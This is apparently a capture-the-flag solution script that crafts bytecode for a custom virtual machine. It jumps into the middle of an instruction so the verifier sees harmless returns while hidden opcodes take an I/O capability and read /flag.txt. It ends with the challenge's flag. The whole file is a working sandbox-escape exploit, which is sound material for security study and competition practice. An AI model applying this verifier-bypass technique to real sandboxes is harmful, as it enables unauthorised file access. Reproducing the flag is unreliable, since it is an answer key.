#!/usr/bin/env python3
import sys

def enc_str(s: str) -> bytes:
    b = s.encode("utf-8")
    if len(b) > 0x200:
        raise ValueError("string const too long")
    return bytes([0x02, len(b) & 0xff, (len(b) >> 8) & 0xff]) + b  # type=2, u16le length

def build() -> str:
    nr = 64  # must be >= 50 so we can use r49

    # const[0] must be "caps" for the global loader
    # const[1] is the absolute path we want
    consts = [enc_str("caps"), enc_str("/flag.txt")]

    code = bytes([
        0x02, 0x00, 0x00,              # r0 = caps
        0x20, 0x31, 0x00, 0x03,         # r49 = r0[3]  (io cap)

        0x60, 0x02, 0x00,              # jmp +2 -> into the *middle* of the next instruction

        0x60, 0x00, 0x21,              # (not executed) container jmp; its HIGH offset byte is 0x21
        0x31, 0x02,                    # (not executed) verifier sees: return r2
        0x31, 0x00,                    # (not executed) verifier sees: return r0

        # execution resumes here after the hidden opcode runs:
        0x01, 0x03, 0x01,              # r3 = "/flag.txt"
        0x30, 0x04, 0x31, 0x02, 0x01, 0x03,  # r4 = r49.call(r2, [r3])
        0x31, 0x04                     # return r4
    ])

    blob = bytes([nr, len(consts)]) + b"".join(consts) + code
    return blob.hex()

if __name__ == "__main__":
    print(build())


# uoftctf{c4ch3_m3_1n11n3_h0w_80u7_d4h??}